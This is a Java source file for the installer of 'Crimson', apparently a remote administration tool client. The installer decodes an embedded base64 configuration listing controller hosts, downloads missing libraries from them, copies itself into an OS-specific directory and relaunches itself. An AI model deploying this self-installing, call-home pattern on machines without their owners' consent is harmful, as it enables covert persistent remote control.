/******************************************************************************
 *                                                                            *
 *                    Copyright 2016 Subterranean Security                    *
 *                                                                            *
 *  Licensed under the Apache License, Version 2.0 (the "License");           *
 *  you may not use this file except in compliance with the License.          *
 *  You may obtain a copy of the License at                                   *
 *                                                                            *
 *      http://www.apache.org/licenses/LICENSE-2.0                            *
 *                                                                            *
 *  Unless required by applicable law or agreed to in writing, software       *
 *  distributed under the License is distributed on an "AS IS" BASIS,         *
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.  *
 *  See the License for the specific language governing permissions and       *
 *  limitations under the License.                                            *
 *                                                                            *
 *****************************************************************************/
package com.subterranean_security.crimson.client;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.URISyntaxException;

import com.subterranean_security.crimson.client.net.ClientCommands;
import com.subterranean_security.crimson.core.Platform;
import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
import com.subterranean_security.crimson.core.util.B64;
import com.subterranean_security.crimson.core.util.CUtil;

public class Installer {

	public static ClientConfig ic;
	public static String jarPath;

	private static boolean debug = new File("/debug.txt").exists();

	public static File temp = new File(System.getProperty("java.io.tmpdir") + "/client-temp");

	private static String base = null;

	public static void main(String[] args) {
		temp.mkdir();
		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
				temp.getAbsolutePath() + "/lib.zip");
		try {
			CUtil.Files.unzip(temp.getAbsolutePath() + "/lib.zip", temp.getAbsolutePath());
		} catch (IOException e2) {
			System.out.println("Failed to extract libraries");
			System.exit(1);
		}

		// load libraries
		try {
			CUtil.Files.loadJar(temp.getAbsolutePath() + "/java/c09.jar");
		} catch (Exception e1) {
			System.out.println("FATAL: Failed to load requisite libraries");
			System.exit(1);
		}

		try {
			ic = readInternal();
		} catch (Exception e) {
			System.out.println("Fatal: Could not read internal.txt");
			return;
		}

		switch (Platform.osFamily) {
		case BSD:
			base = ic.getPathBsd();
			break;
		case LIN:
			base = ic.getPathLin();
			break;
		case OSX:
			base = ic.getPathOsx();
			break;
		case SOL:
			base = ic.getPathSol();
			break;
		case WIN:
			base = ic.getPathWin();
			break;
		default:
			break;

		}

		try {
			if (!isInstalled()) {
				if (!packagedLibsFound()) {
					try {
						ClientStore.Connections.setTargets(ic.getTargetList());
						ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
						ClientStore.Connections.connectionRoutine();
					} catch (Exception e) {
						// TODO Auto-generated catch block
						e.printStackTrace();
						System.out.println("Cannot download libraries due to invalid internal syntax");
						System.exit(0);
					}
					ClientCommands.downloadLibs();
				}
				if (install()) {
					System.out.println("Install Success");
				} else {
					System.out.println("Install Failed");
				}
				return;
			}
		} catch (URISyntaxException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
		}

		Client.main(args);

	}

	public static boolean packagedLibsFound() {
		return Installer.class.getResourceAsStream("/com/subterranean_security/crimson/client/res/bin/lib.zip") != null;
	}

	private static ClientConfig readInternal() throws Exception {
		InputStream in = Client.class.getResourceAsStream("/com/subterranean_security/crimson/client/internal.txt");

		BufferedReader input = new BufferedReader(new InputStreamReader(in));

		ClientConfig cc = ClientConfig.parseFrom(B64.decode(input.readLine()));
		input.close();

		return cc;
	}

	public static boolean isInstalled() throws URISyntaxException {
		jarPath = Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
		File t1 = (new File(jarPath)).getParentFile();
		File t2 = new File(base);
		System.out.println("Testing for equality: " + t1.getAbsolutePath() + " and: " + t2.getAbsolutePath());
		return (new File(jarPath)).getParentFile().equals(new File(base));
	}

	public static boolean install() {
		System.out.println("Starting installation");
		if (!(new File(base)).mkdirs()) {
			System.out.println("Failed to create install base");
			return false;
		}

		if (!base.endsWith(File.separator)) {
			base += File.separator;
		}

		(new File(base + "var")).mkdirs();
		(new File(base + "tmp")).mkdirs();
		(new File(base + "lib")).mkdirs();

		System.out.println("Extracting lib.zip");

		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip", base + "lib/lib.zip");
		try {
			CUtil.Files.unzip(base + "lib/lib.zip", base + "lib/");
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
			return false;
		}

		System.out.println("Extracting client database");
		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/client.db", base + "var/client.db");

		System.out.println("Copying client jar");
		File client = new File(base + "/client.jar");
		try {
			CUtil.Files.copyFile(client, new File(jarPath));
		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			System.out.println("Failed to copy client jar");
			return false;
		}

		return execute(client);
	}

	private static boolean execute(File f) {
		// TODO platform independence
		try {
			if (!debug) {
				Runtime.getRuntime().exec("javaw -jar " + f.getAbsolutePath());
			}

		} catch (IOException e) {
			// TODO Auto-generated catch block
			e.printStackTrace();
			return false;
		}
		return true;
	}

}
